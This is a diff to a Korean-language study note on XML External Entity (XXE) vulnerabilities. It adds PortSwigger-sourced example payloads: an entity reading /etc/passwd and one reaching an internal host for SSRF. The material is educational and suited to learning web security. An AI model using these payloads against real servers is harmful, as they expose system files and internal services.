@@ -12,10 +12,27 @@
 </book>
 ```
 
-- XML 데이터를 처리할 때 발생하는 공격으로 주로 공격자가 서버 시스템 파일을 읽을 수 있게 되거나 백엔드 시스템과 상호작용할 수 있게 되는 취약점이다.
+- XML 데이터를 처리할 때 (= parsing) 발생하는 공격으로 주로 공격자가 서버 시스템 파일을 읽을 수 있게 되거나 백엔드 시스템과 상호작용할 수 있게 되는 취약점이다.
 
-### XXE 취약점 발생 예시
+### XXE 취약점 발생 & XXE 공격 예시 (출처: PortSwigger)
 
+- 파일을 찾을 때 XXE 활용
+
+```XML
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <!--/etc/passwd 파일을 찾는 구문 삽입-->
+<stockCheck>
+  <productId>&xxe;</productId> <!- &xxe 변수에 /etc/passwd 파일 내용이 들어감-->
+</stockCheck>
+```
+
+- SSRF 공격을 하기 위해 XXE 활용
+
+```XML
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
+```
+
+- Content-Type 수정으로 XXE 공격 시도
 
 
 ### 문제 풀이
